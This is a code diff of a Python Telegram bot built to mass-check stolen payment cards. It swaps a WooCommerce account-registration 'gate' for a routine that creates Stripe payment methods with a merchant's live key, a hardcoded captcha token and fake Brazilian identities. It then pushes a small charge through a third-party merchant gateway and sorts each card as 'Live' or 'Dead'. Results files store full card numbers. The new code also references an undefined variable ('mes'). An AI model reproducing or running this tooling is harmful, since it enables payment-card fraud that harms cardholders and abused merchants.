@@ -7,16 +7,13 @@ from telebot import types
 
 # ===== CONFIGURATION =====
 P_URL = "" 
-S_PK = 'pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs'
-S_ACC = 'acct_1Mpulb2El1QixccJ'
 
 # Get bot token from environment variable
 BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
 if not BOT_TOKEN:
     print("❌ ERROR: TELEGRAM_BOT_TOKEN environment variable not set!")
     print("💡 Set it in Render dashboard: Environment → Add Environment Variable")
-    # You can also set a default for local testing
-    # BOT_TOKEN = "your-token-here"
+    BOT_TOKEN = ""
 
 # ===== FLASK WEB SERVER (for Render keep-alive) =====
 app = Flask(__name__)
@@ -38,115 +35,170 @@ def health():
 def ping():
     return "pong", 200
 
-# ===== CARD CHECKING CLASS (ORIGINAL FUNCTIONALITY - NO CHANGES) =====
-class Gate:
+# ===== NEW CARD CHECKING CORE MECHANICS =====
+class CardChecker:
     def __init__(self):
-        self.s = requests.Session()
+        self.session = requests.Session()
         if P_URL:
-            self.s.proxies = {'http': P_URL, 'https': P_URL}
-            
-        self.s.headers.update({
-            'authority': 'redbluechair.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'accept-language': 'en-US,en;q=0.9',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-            'origin': 'https://redbluechair.com',
-            'referer': 'https://redbluechair.com/my-account/',
-            'upgrade-insecure-requests': '1',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"'
+            self.session.proxies = {'http': P_URL, 'https': P_URL}
+        
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; moto g15 Build/VVTA35.51-137) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7444.171 Mobile Safari/537.36',
+            'Accept': 'application/json, text/plain, */*',
+            'Content-Type': 'application/json',
         })
-
-    def rnd_str(self, l=10):
-        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=l))
-
-    def reg(self):
+    
+    def get_str(self, string: str, start: str, end: str) -> str:
+        """Extract substring between start and end markers."""
         try:
-            r1 = self.s.get('https://redbluechair.com/my-account/')
-            n = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', r1.text).group(1)
-            rnd = self.rnd_str()
-            dt = {
-                'email': f'user{rnd}@gmail.com',
-                'password': f'Pass{rnd}!!',
-                'register': 'Register',
-                'woocommerce-register-nonce': n,
-                '_wp_http_referer': '/my-account/'
-            }
-            r2 = self.s.post('https://redbluechair.com/my-account/', data=dt)
-            return "Log out" in r2.text
+            parts = string.split(start, 1)
+            if len(parts) > 1:
+                return parts[1].split(end, 1)[0]
         except:
-            return False
-
-    def tok(self, cc, mm, yy, cvv):
+            pass
+        return ""
+    
+    def format_year(self, year: str) -> str:
+        """Format year to two-digit format."""
+        year_mapping = {
+            "2030": "30", "2031": "31", "2032": "32", "2033": "33",
+            "2021": "21", "2022": "22", "2023": "23", "2024": "24",
+            "2025": "25", "2026": "26", "2027": "27", "2028": "28",
+            "2029": "29"
+        }
+        return year_mapping.get(year, year[-2:] if year else "")
+    
+    def generate_random_name(self) -> tuple:
+        """Generate random Brazilian name."""
+        names = [
+            ['marcos', 'rodrigues'], ['abreu', 'vieira'], ['murilo', 'castro'], ['diego', 'oliveira'],
+            ['alberto', 'gomes'], ['dario', 'almeida'], ['micael', 'andrade'], ['rodrigo', 'barros'],
+            ['marlon', 'borges'], ['silva', 'campos'], ['Abrahao', 'cardoso'], ['Abade', 'carvalho'],
+            ['francisco', 'costa'], ['alan', 'dias'], ['ronaldo', 'dantas'], ['marinho', 'duarte'],
+            ['Abelardo', 'santos'], ['magal', 'freitas'], ['lemos', 'fernandes'], ['thales', 'ferreira'],
+            ['tiago', 'garcia'], ['Diniz', 'goalves'], ['luiz', 'lima'], ['heitor', 'lopes'],
+            ['leandro', 'machado'], ['arthur', 'marques'], ['david', 'bernardo'], ['juan', 'martins'],
+            ['diogo', 'medeiros'], ['caue', 'melo'], ['joaquin', 'mendes'], ['isaac', 'miranda'],
+            ['carlos', 'monteiro'], ['andre', 'moraes'], ['marrone', 'neves'], ['ian', 'moreira'],
+        ]
+        random_name = random.choice(names)
+        return random_name[0].capitalize(), random_name[1].capitalize()
+    
+    def generate_email(self, first_name: str, last_name: str) -> str:
+        """Generate random email."""
+        return f"{first_name.lower()}{last_name.lower()}{random.randint(100, 9999)}@gmail.com"
+    
+    def check_card(self, cc, mm, yy, cvv):
+        """Check a single card using the new mechanics"""
         try:
-            h = {
-                'authority': 'api.stripe.com',
-                'accept': 'application/json',
-                'content-type': 'application/x-www-form-urlencoded',
+            # Clean card number (remove spaces)
+            cc = cc.replace(' ', '')
+            
+            # Clean expiration
+            if len(mm) == 1:
+                mm = f"0{mm}"
+            if len(yy) == 2:
+                yy = f"20{yy}"
+            
+            # Format year
+            formatted_year = self.format_year(yy)
+            
+            # Generate random user data
+            first_name, last_name = self.generate_random_name()
+            email = self.generate_email(first_name, last_name)
+            
+            headers_stripe = {
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 15; moto g15 Build/VVTA35.51-137) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7444.171 Mobile Safari/537.36',
+                'Accept': 'application/json',
+                'Content-Type': 'application/x-www-form-urlencoded',
                 'origin': 'https://js.stripe.com',
-                'referer': 'https://js.stripe.com/',
-                'user-agent': self.s.headers['user-agent']
-            }
-            d = {
-                'type': 'card',
-                'card[number]': cc,
-                'card[cvc]': cvv,
-                'card[exp_year]': yy,
-                'card[exp_month]': mm,
-                'key': S_PK,
-                '_stripe_account': S_ACC,
-                'payment_user_agent': 'stripe.js/cba9216f35; stripe-js-v3/cba9216f35; payment-element; deferred-intent',
-                'referrer': 'https://redbluechair.com',
-                'guid': '8c58666c-8edd-46ee-a9ce-0390cd63f8028e5c25',
-                'muid': 'ea2ab4e5-2059-438e-b27d-3bd4d6a94ae29d8630',
-                'sid': '53c09a94-1512-4db1-b3c0-f011656359e1281fed'
-            }
-            r = requests.post('https://api.stripe.com/v1/payment_methods', headers=h, data=d)
-            return r.json().get('id')
-        except:
-            return None
-
-    def add(self, pm):
-        try:
-            r1 = self.s.get('https://redbluechair.com/my-account/add-payment-method/')
-            txt = r1.text
-            n = None
-            m1 = re.search(r'"createSetupIntentNonce":"([^"]+)"', txt)
-            if m1: n = m1.group(1)
-            if not n:
-                m2 = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', txt)
-                if m2: n = m2.group(1)
-            if not n:
-                m3 = re.search(r'"create_setup_intent_nonce":"([a-z0-9]+)"', txt)
-                if m3: n = m3.group(1)
-            
-            if not n: return "Error"
-
-            h = self.s.headers.copy()
-            h.update({'x-requested-with': 'XMLHttpRequest', 'referer': 'https://redbluechair.com/my-account/add-payment-method/'})
-            
-            pl = {
-                'action': (None, 'create_setup_intent'),
-                'wcpay-payment-method': (None, pm),
-                '_ajax_nonce': (None, n)
             }
             
-            r2 = self.s.post('https://redbluechair.com/wp-admin/admin-ajax.php', headers=h, files=pl)
-            js = r2.json()
+            headers_auxilia = {
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 15; moto g15 Build/VVTA35.51-137) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7444.171 Mobile Safari/537.36',
+                'Accept': 'application/json, text/plain, */*',
+                'Content-Type': 'application/json',
+            }
             
-            if js.get('success') is True:
-                return "Approved"
+            hcaptcha_token = "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZSI6MCwiZXhwIjoxNzY1MTY4MzE3LCJjZGF0YSI6ImNNVTdjL1I5UStLbVFKV3VHV1Yxb2M4SXBCMW4xcFdCZThNUHlEdUlNSnQyaFU3V0EvWnBzSTAxbUpLZ2RqQmhESGlkU2ttbXhnSFM2bjNqOFdRbnJwekVTQWdVeithNlFXSzE0VlljTkttUy9OTkkyZjhmZjY2bnlCVHFiWXF1TGx5ZklZYmtyWUlrMXlmQVgzdUdlWEtmVVZ3bUs3L2NtQ3pCTHhURElEU0ZEQlFGUk9JWjI1QUxxY21hS1U1bDJESFRGMjA5M0JFb2ZqNUMiLCJwYXNza2V5IjoiSFpNVFlVU2VFN3FGOHp1amptVjR1RzdaVjBrMFM5WE1TcVFvRTY4RHF1ckFBVVZBKzBsTHBEVkFEdnQxZG1vMFgzSDJTV1MyTDJub0c3cUdRN0l5cmp4MW9CREJFS0doblRCNHNZbS9jVkZyOGo1aGFWc1AvYlprcGlja3RIRUNxUk51akJZWWV6dURxUlVPVFlMYzZTZ2tnaTlrOXZzYVVyU1lNekpzSTJnSWNUcHk2dnBEOHJrMml1T2pmUlhzbFR5TllmOXhxOGt5dXpRamczRzlTTnF3WE1USnYzUnpiK25HWVIvQ3BnL1ZuTnEwNTdzS0dYT3Y1dWFsQzJCSFI3K3dWVnIrVlpCVHJlbjBSRGREQkN4a1ZsM1VadElFaFZtc3g0dUprYVhuRzdqeVhuTXVjM2thRzV3ejd5WEREVG4xUzF6eG9JNE1sellGeTZJMkJVVWd1QWY4bUd2WUo4UDdxRjdNMFBhbk50cG5sM0MzenFnUDNKSHRUVlErQmJYNmU1ZXduRFRBaHpEK3NnVEhXU3RrdlRUQStyNzdVbWxTQXFPODRsdGk2TysxYUVvMWpUTFBTbFJaUFBFWUw3UTZmY2tvK3VpSmRsTVl0QUJ4eEJQeUtHRFYxK3AyU0ZSWkxVSnB5cEtjcEZXNi90SmVCd0V2UDVLSzc3N2RmZ09yVTM3NXBrVTlmQXRPMlRqSXRJZjRJcGYwWTlmT3ZGdzdJSTY3cDdsTis1MjdhSjl3SmFRRDU5Q25qdmZKbklHTVpOc2M1R2RxRzR4Z0pqOW0xM3JoamRuZnFTMHozSDUyUmFzZDJiK25NN1YvemgwdmFibEo4ZjkvemZiQ1VpUlQ1cjVDUDcxeUxXVVlMeDNvbUZVdlQ4QmEwQTNRM28yRCt1VVNadjl2Z0EzeWg0MmtmMGRhUUFoWGt4ejNLOWVCRm1XWEVac0VGak5RMU8rRW9Pck1xWGlnRmV0UkVFQStRbll2OVNiY3ZublppM2w0UWJUMGFYOGJpc2hmR1R6WmRRTHNidDNIL0VGcDNnTGgvMUdONmxXVW0vR2JtQmw2ZTEzMnNIeE82NHQwSzZCR1RVc0tUOFI5ZU5wU3h3VmkwbThuQlZPOThrTHE5S0tXVmJwa0VNM0Z1eDVaVFlyVmcyUTdjYUFleGRSOTFDczRHMU56UUVyL0NZWUtlTnZub3B6QUNVVjZmalBOeDlJODNsQ3ZLWHgzNjBBOU9LeExkQWM5V0NHUmJIK1pPeEwyTHFkV2V3UDZpUyt3ajZlcWMrWHo5L0oxOVNMNWhGMHBvVnJwMHcyai9XbW5JTkNpWk5pbkp6MWtXTUhoNWxzY2gzN2lNQ3lseC84N0RRb0FucHA2WmZrR1FWYjZEWHF6enBaVEpuckVNa3NOZlE4WlMxTmh1TnJsUFVWTW82c3ZKbW80dmpYZ3RnN2Jrc1ZjeXg2SjhUSVdiQW5ZYzFFU1lFcG5RRGgvSDBNTmhSTnlCSGNudUlBUWZXOCsrQ2JxSWVUb25EY2JhUzJrV05jZEE2QzZsSTY0VGVScGVnTUNyYzJ5d0g5by9DaXpNaU5BVmlOM0IzSGQzZ0toY2IvZUUybzY3SzE4ZzFxdlBKbzhqcC9rNEVOZ0xkZFJWSXFaYTd5MHp3SmZlQVRpZTFNWU52TzlBdW9NNHBIWXhGVlJ3cXlBSyszYlI3KzI4a0o2WEZrQkcxS0VwUmhJa1hHUWh1RzRVdkhVVWNGQTAyWUx0MTZ1a1J4VWpWcXJncGkyK0JUNWRiVkhuZ003T2o1OW5ZbUw1bzRHWVVXU0NqbzhhNXZsaDF6cjF0MDhuNFJuQ3Q0eW45eGwranZEMjQ4U1dGTFdIOUxlOVRwREZzQmU1T3ZUeUxIcTBtemhuWTViVUNiUXZoaWxjWlE5TDBFY2xlYTY2M3YyRHRBcWtLZU14T2t5NDdrbGlZZGtDZ3dYdS9BTURVNUpRdndURHpOaVhaNVRNMWdQUStCRStkSU5McWlVMkw0c3NsRGRweUVYS21vV0FnWFo1amkrVDlFeWJZb0JldnZ6bVg5NDB3ZkRLL0thYm4xWVY2VkZYRGhKMnhraHVhV2hXbGhxa1dmT2pSdFJCZUpmc21iUUdVdjBUcUR0R3RWVjlya1Rua25Tem41a0dTZHh3V1BCak1qMTBKU25WOGZITWY4ZDZMbUJZQWxHVnZrcXhMV3NRVjQ0c2xtU0tkSWpNOUY1VVorNWJFYXdpTjRBTDNNUkdXMVdSZ3lXa0ZjbVNNdkowRXd5eWd5TFk4L0JJRVJOeTVzRmxmb1lGVXl5SC9FV2JRcFlnemdXR251Q1BEMCtCUVBhbWRCVkkxMFZKSmdQZmtDUkdGWC9SR0h4VHI1aW5ud3VYRVA3MHBId1NDdEZzRW5QTEd6SE9FL2p3cE9FaWsxelB2Ui8ySGJETC82c1dUeVZMZXFRYVhMc0o4OXBDNk1JSXFid2ZhSTJ3TXRtNGcvb0ZDNnFTQnRrdndFQzU4SUVIcXhDUkZqL0dDYUNubFBsT1BtTVJwUkI1QjFhZUQ4NEZsZk5xV2lvalpQSTFxZnJWQmt5UkNlS211MVdWVTFEYmNacXQ1NDQ3TXdNV00zd2hjOGNsRkE9Iiwia3IiOiIzN2Y3N2FmYyIsInNoYXJkX2lkIjo3MTc3MTUzN30.-V-0_gZVA7F0tmV140yPxGp0s1biNTsFG6ACn1uQyUU"
+            
+            # Step 1: Create payment method
+            post_data1 = f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={formatted_year}&guid=5d319c85-6154-4dbd-bce8-7f2e6aaa139e9076ee&muid=3c91e096-1757-4928-a91b-904da3a9b8e7bbf6ca&sid=3d879f8a-122c-454a-9e7f-969c91b42fa13fc2fc&payment_user_agent=stripe.js%2F9390d43c1d%3B+stripe-js-v3%2F9390d43c1d%3B+split-card-element&referrer=https%3A%2F%2Fapp.theauxilia.com&time_on_page=214019&client_attribution_metadata[client_session_id]=6c9975d6-d147-4662-a3e8-7954aba80f3b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51JExFOBmd3aFvcZgZ4ObBfLAlSW1hTefXW3iTMlexRmlClSjS6SvAAcOV4AOebLfcEptsRpLPzEzo18rl3WQZl4U00PJU9Kk2K&_stripe_account=acct_1OUaY9PWD3UOxDVR&radar_options[hcaptcha_token]={hcaptcha_token}"
+            
+            r1 = self.session.post(
+                'https://api.stripe.com/v1/payment_methods',
+                headers=headers_stripe,
+                data=post_data1,
+                timeout=15
+            )
+            result1 = r1.text
+            payment_id = self.get_str(result1, '"id": "', '"')
+            
+            if not payment_id:
+                return "card_error", "Failed to get payment ID"
+            
+            # Step 2: Initialize payment
+            payload2 = {
+                "email": email,
+                "clientID": "b189cf6a-7911-4f9f-a8c6-a5115105dec2",
+                "ammount": 5.48,
+                "paymentMethod": payment_id
+            }
+            
+            r2 = self.session.post(
+                'https://app-production-gateway-api.politeisland-fa948fee.eastus2.azurecontainerapps.io/Merchant/InitializePayment',
+                headers=headers_auxilia,
+                json=payload2,
+                timeout=15
+            )
+            result2 = r2.text
+            token2 = self.get_str(result2, '"token":"', '"')
+            token1 = self.get_str(result2, '"token":"', '_s')
+            
+            if not token1 or not token2:
+                return "card_error", "Failed to get payment tokens"
+            
+            # Step 3: Confirm setup intent
+            post_data3 = f"expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51JExFOBmd3aFvcZgZ4ObBfLAlSW1hTefXW3iTMlexRmlClSjS6SvAAcOV4AOebLfcEptsRpLPzEzo18rl3WQZl4U00PJU9Kk2K&_stripe_account=acct_1OUaY9PWD3UOxDVR&client_attribution_metadata[client_session_id]=6c9975d6-d147-4662-a3e8-7954aba80f3b&client_attribution_metadata[merchant_integration_source]=l1&client_secret={token2}"
+            
+            r3 = self.session.post(
+                f'https://api.stripe.com/v1/setup_intents/{token1}/confirm',
+                headers=headers_stripe,
+                data=post_data3,
+                timeout=15
+            )
+            result3 = r3.text
+            
+            # Parse response and map to status
+            if "Your card's security code is incorrect." in result3:
+                return "✅", "INVALID_CVC - Card is live but CVC wrong"
+            elif "Your card has expired." in result3:
+                return "✅", "EXPIRED_CARD - Card was valid"
+            elif "generic_decline" in result3:
+                return "❌", "Generic decline - Card dead"
+            elif "do_not_honor" in result3:
+                return "❌", "Do not honor - Card dead"
+            elif "card number is incomplete." in result3:
+                return "❌", "Incomplete card - Invalid format"
+            elif "Your card does not support this type of purchase." in result3:
+                return "❌", "Purchase not supported - Card dead"
+            elif 'incorrect_number' in result3:
+                return "❌", "Invalid card number - Card dead"
+            elif 'Unrecognized request URL' in result3:
+                return "⚠️", "API error - Try again"
+            elif 'succeeded' in result3:
+                return "✅", "Charged 5.48 R$ - Card live"
             else:
-                msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
-                return msg
-        except:
-            return "Error"
+                return "⚠️", "Unknown response - Check manually"
+                
+        except requests.exceptions.Timeout:
+            return "⚠️", "Timeout - Network issue"
+        except requests.exceptions.ConnectionError:
+            return "⚠️", "Connection error - Network issue"
+        except Exception as e:
+            return "⚠️", f"Error: {str(e)[:50]}"
 
-# ===== STYLISH FORMATTING FUNCTIONS =====
+# ===== STYLISH FORMATTING FUNCTIONS (KEEPING YOUR EXACT UI) =====
 def create_progress_bar(percentage, width=15):
     """Create a compact progress bar"""
     filled = int(width * percentage / 100)
@@ -166,30 +218,40 @@ def format_time(seconds):
         mins = int((seconds % 3600) // 60)
         return f"{hours}h {mins}m"
 
-def get_status_info(result):
+def get_status_info(result_code, result_message):
     """Get appropriate emoji and descriptive message for status"""
-    # First, check for declines (case insensitive)
-    result_lower = str(result).lower()
-    
-    if result == "Approved":
-        return "✅", "Approved - Card is valid"
-    elif "declined" in result_lower or "card" in result_lower or "security" in result_lower or "fund" in result_lower:
-        # These are likely decline messages
-        if result == "Declined":
-            return "❌", "Declined - Card was declined"
-        elif "security" in result_lower:
-            return "❌", "Declined - Security code incorrect"
-        elif "fund" in result_lower:
-            return "❌", "Declined - Insufficient funds"
-        elif "card" in result_lower:
-            return "❌", "Declined - " + result
+    # Simplified mapping based on result code
+    if result_code == "✅":
+        if "INVALID_CVC" in result_message:
+            return "✅", "Live - Invalid CVC"
+        elif "EXPIRED_CARD" in result_message:
+            return "✅", "Live - Expired"
+        elif "Charged" in result_message:
+            return "✅", "Live - Charged"
         else:
-            return "❌", "Declined - " + result
-    elif result == "Error":
-        return "⚠️", "Error - Processing error"
-    else:
-        # Unknown result
-        return "⚠️", "Error - " + str(result)
+            return "✅", "Live - " + result_message
+    elif result_code == "❌":
+        if "Generic decline" in result_message:
+            return "❌", "Dead - Generic decline"
+        elif "Do not honor" in result_message:
+            return "❌", "Dead - Do not honor"
+        elif "Incomplete" in result_message:
+            return "❌", "Dead - Invalid format"
+        elif "Purchase not supported" in result_message:
+            return "❌", "Dead - Not supported"
+        elif "Invalid card number" in result_message:
+            return "❌", "Dead - Invalid number"
+        else:
+            return "❌", "Dead - " + result_message
+    else:  # ⚠️
+        if "Timeout" in result_message:
+            return "⚠️", "Error - Timeout"
+        elif "Connection error" in result_message:
+            return "⚠️", "Error - Connection"
+        elif "API error" in result_message:
+            return "⚠️", "Error - API"
+        else:
+            return "⚠️", "Error - " + result_message
 
 def mask_card(card_number):
     """Mask card number compactly"""
@@ -198,9 +260,10 @@ def mask_card(card_number):
     return card_number
 
 # ===== TELEGRAM BOT =====
-# Global storage
+# Global storage (KEEPING YOUR EXACT STRUCTURE)
 checking_processes = {}
 results_data = {}
+card_checker = CardChecker()
 
 # Initialize bot
 if BOT_TOKEN:
@@ -208,43 +271,57 @@ if BOT_TOKEN:
 else:
     bot = None
 
-def process_single_card(card_line, message_id):
-    """Process a single card - ORIGINAL CORE FUNCTIONALITY"""
+def process_single_card(card_line, message_id=None):
+    """Process a single card - USING NEW MECHANICS"""
     if not card_line.strip():
         return "❌ Empty line"
     
-    sp = card_line.strip().split('|')
-    if len(sp) < 4:
-        return f"❌ Format error"
-    
-    cc, mm, yy, cvv = sp[0], sp[1], sp[2], sp[3]
-    
-    api = Gate()
-    if api.reg():
-        tok = api.tok(cc, mm, yy, cvv)
-        if tok:
-            res = api.add(tok)
-        else:
-            res = "Error - Tokenization failed"
-    else:
-        res = "Error - Registration failed"
-    
-    emoji, description = get_status_info(res)
-    
-    return {
-        'card': cc,
-        'exp': f"{mm}/{yy}",
-        'result': res,
-        'emoji': emoji,
-        'description': description,
-        'masked': mask_card(cc),
-        'is_decline': emoji == "❌",  # Track if it's a decline
-        'is_error': emoji == "⚠️",     # Track if it's an error
-        'is_approved': emoji == "✅"   # Track if it's approved
-    }
+    try:
+        sp = card_line.strip().split('|')
+        if len(sp) < 4:
+            return f"❌ Format error"
+        
+        cc, mm, yy, cvv = sp[0], sp[1], sp[2], sp[3]
+        
+        # Check card using new mechanics
+        result_code, result_message = card_checker.check_card(cc, mm, yy, cvv)
+        
+        # Get emoji and description
+        emoji, description = get_status_info(result_code, result_message)
+        
+        # Determine status for counters
+        is_approved = emoji == "✅"
+        is_decline = emoji == "❌"
+        is_error = emoji == "⚠️"
+        
+        return {
+            'card': cc,
+            'exp': f"{mm}/{yy}",
+            'result': result_message,
+            'emoji': emoji,
+            'description': description,
+            'masked': mask_card(cc),
+            'is_decline': is_decline,
+            'is_error': is_error,
+            'is_approved': is_approved,
+            'short_desc': description.split(' - ')[0] if ' - ' in description else description
+        }
+    except Exception as e:
+        return {
+            'card': card_line.split('|')[0] if '|' in card_line else "Unknown",
+            'exp': "??/??",
+            'result': str(e),
+            'emoji': "⚠️",
+            'description': f"Error: {str(e)[:50]}",
+            'masked': "****",
+            'is_decline': False,
+            'is_error': True,
+            'is_approved': False,
+            'short_desc': "Error"
+        }
 
 def process_file_mass_check(filename, message_id, user_id, chat_id):
-    """Process cards from file with progress updates - UPDATED TO UPDATE AFTER EACH CARD"""
+    """Process cards from file with progress updates - ORIGINAL UI"""
     try:
         with open(filename, 'r') as f:
             lines = [line.strip() for line in f if line.strip()]
@@ -253,7 +330,7 @@ def process_file_mass_check(filename, message_id, user_id, chat_id):
         if total == 0:
             return "empty"
         
-        # Initialize check data
+        # Initialize check data (KEEPING YOUR EXACT STRUCTURE)
         check_id = f"check_{user_id}_{int(time.time())}"
         checking_processes[check_id] = {
             'user_id': user_id,
@@ -279,7 +356,7 @@ def process_file_mass_check(filename, message_id, user_id, chat_id):
         # Send initial progress message
         send_progress_update(check_id, initial=True)
         
-        # Process cards
+        # Process cards ONE BY ONE
         for i, card_line in enumerate(lines, 1):
             if not checking_processes[check_id]['running']:
                 break
@@ -290,26 +367,25 @@ def process_file_mass_check(filename, message_id, user_id, chat_id):
             result = process_single_card(card_line, message_id)
             
             checking_processes[check_id]['completed'] = i
-            checking_processes[check_id]['results'].append(result)
             
-            # Update stats based on actual status
             if isinstance(result, dict):
+                checking_processes[check_id]['results'].append(result)
+                
+                # Update stats
                 if result['is_approved']:
                     results_data[check_id]['approved'] += 1
                 elif result['is_decline']:
                     results_data[check_id]['declined'] += 1
                 elif result['is_error']:
                     results_data[check_id]['error'] += 1
-                else:
-                    # Default to error for unknown
-                    results_data[check_id]['error'] += 1
                 
                 results_data[check_id]['cards'].append(result)
             
-            # UPDATE AFTER EACH CARD
+            # UPDATE AFTER EACH CARD with live counters
             send_progress_update(check_id)
             
-            time.sleep(1)
+            # Small delay between cards
+            time.sleep(1.5)
         
         # Send final report
         if check_id in checking_processes and checking_processes[check_id]['running']:
@@ -321,15 +397,16 @@ def process_file_mass_check(filename, message_id, user_id, chat_id):
         return f"error: {str(e)}"
 
 def send_progress_update(check_id, initial=False):
-    """Send progress update to user - UPDATED FOR REAL-TIME UPDATES"""
+    """Send progress update to user - ORIGINAL UI WITH LIVE COUNTERS"""
     if check_id not in checking_processes or not bot:
         return
     
     check = checking_processes[check_id]
     total = check['total']
     completed = check['completed']
+    results = results_data.get(check_id, {})
     
-    # Throttle updates if they're too fast (minimum 0.5 seconds between updates)
+    # Throttle updates (minimum 0.5 seconds between updates)
     current_time = time.time()
     if not initial and current_time - check.get('last_update_time', 0) < 0.5:
         return
@@ -352,28 +429,46 @@ def send_progress_update(check_id, initial=False):
         eta_seconds = time_per_card * remaining_cards
         eta_str = f" • ETA: `{format_time(eta_seconds)}`"
     
-    # Get last card result
+    # ===== LIVE COUNTERS =====
+    live_counters = ""
+    if results:
+        approved = results.get('approved', 0)
+        declined = results.get('declined', 0)
+        errors = results.get('error', 0)
+        
+        # Calculate success rate
+        success_rate = int((approved / completed * 100)) if completed > 0 else 0
+        
+        live_counters = (
+            f"\n\n*LIVE COUNTERS:*\n"
+            f"✅ `{approved}` Live\n"
+            f"❌ `{declined}` Dead\n"
+            f"⚠️ `{errors}` Errors\n"
+            f"`{success_rate}%` Success Rate"
+        )
+    
+    # ===== RECENT CARDS (last 3) =====
+    recent_cards = ""
+    if len(check['results']) > 1:
+        recent_cards = "\n\n*Recent:*\n"
+        # Show last 3 cards processed
+        for result in check['results'][-3:]:
+            if isinstance(result, dict):
+                recent_cards += f"`{result['masked']}` {result['emoji']} {result['short_desc']}\n"
+    
+    # ===== LAST CARD DETAILS =====
     last_card_info = ""
     if check['results']:
         last_result = check['results'][-1]
         if isinstance(last_result, dict):
-            short_desc = last_result['description'].split(' - ')[0]
-            last_card_info = f"\n\n*Last Checked:*\n`{last_result['masked']}` {last_result['emoji']} {short_desc}"
+            last_card_info = f"\n\n*Last Checked:*\n`{last_result['masked']}` {last_result['emoji']} {last_result['short_desc']}"
     
-    # Get recent cards (last 3)
-    recent_cards = ""
-    if len(check['results']) > 1:
-        recent_cards = "\n\n*Recent:*\n"
-        for result in check['results'][-3:]:
-            if isinstance(result, dict):
-                short_desc = result['description'].split(' - ')[0]
-                recent_cards += f"`{result['masked']}` {result['emoji']} {short_desc}\n"
-    
-    # Create message
+    # Create complete message (ORIGINAL FORMAT)
     message = (
         f"*MASS CHECK IN PROGRESS*\n"
         f"`{progress_bar}` {progress_percent}%\n"
         f"`{completed}/{total}` cards • `{elapsed_str}`{eta_str}"
+        f"{live_counters}"
         f"{last_card_info}"
         f"{recent_cards}"
     )
@@ -406,7 +501,7 @@ def send_progress_update(check_id, initial=False):
         pass
 
 def send_final_report(check_id):
-    """Send final report and results file to user - UPDATED WITH PROPER EMOJIS"""
+    """Send final report and results file to user - ORIGINAL UI"""
     if check_id not in checking_processes or check_id not in results_data or not bot:
         return
     
@@ -428,8 +523,8 @@ def send_final_report(check_id):
         f"*CHECK COMPLETE*\n"
         f"`{total_cards}` cards • `{elapsed_str}`\n"
         f"`{success_rate}%` success rate\n\n"
-        f"✅ `{results['approved']}` Approved\n"
-        f"❌ `{results['declined']}` Declined\n"
+        f"✅ `{results['approved']}` Live\n"
+        f"❌ `{results['declined']}` Dead\n"
         f"⚠️ `{results['error']}` Errors\n\n"
     )
     
@@ -437,10 +532,7 @@ def send_final_report(check_id):
     if results['cards']:
         summary += "*Recent Results:*\n"
         for card in results['cards'][-5:]:
-            # Shorten description for display
-            short_desc = card['description'].split(' - ')[0]
-            # USE THE EMOJI FROM THE CARD DATA
-            summary += f"`{card['masked']}` {card['emoji']} {short_desc}\n"
+            summary += f"`{card['masked']}` {card['emoji']} {card['short_desc']}\n"
     
     # Send summary
     bot.send_message(
@@ -464,7 +556,7 @@ def send_final_report(check_id):
         del checking_processes[check_id]
 
 def save_results_file(check_id):
-    """Save results to a file - UPDATED WITH PROPER EMOJIS IN FILE"""
+    """Save results to a file - ORIGINAL FORMAT"""
     if check_id not in results_data:
         return None
     
@@ -478,8 +570,8 @@ def save_results_file(check_id):
             f.write(f"ID: {check_id}\n")
             f.write("=" * 60 + "\n")
             f.write(f"TOTAL CARDS: {len(results['cards'])}\n")
-            f.write(f"✅ APPROVED: {results['approved']}\n")
-            f.write(f"❌ DECLINED: {results['declined']}\n")
+            f.write(f"✅ LIVE: {results['approved']}\n")
+            f.write(f"❌ DEAD: {results['declined']}\n")
             f.write(f"⚠️ ERRORS: {results['error']}\n")
             f.write(f"SUCCESS RATE: {int((results['approved'] / len(results['cards']) * 100)) if results['cards'] else 0}%\n")
             f.write("=" * 60 + "\n\n")
@@ -487,24 +579,15 @@ def save_results_file(check_id):
             f.write("-" * 60 + "\n")
             
             for i, card in enumerate(results['cards'], 1):
-                # USE THE EMOJI FROM THE CARD DATA IN THE FILE
-                emoji = card['emoji']
-                status_text = ""
-                if card['is_approved']:
-                    status_text = "APPROVED"
-                elif card['is_decline']:
-                    status_text = "DECLINED"
-                else:
-                    status_text = "ERROR"
-                
-                f.write(f"{i:03d}. {emoji} {card['card']}|{card['exp']}|{status_text}|{card['description']}\n")
+                status_text = "LIVE" if card['is_approved'] else "DEAD" if card['is_decline'] else "ERROR"
+                f.write(f"{i:03d}. {card['emoji']} {card['card']}|{card['exp']}|{status_text}|{card['description']}\n")
         
         return filename
     except Exception as e:
         print(f"Error saving results: {e}")
         return None
 
-# ===== BOT COMMAND HANDLERS =====
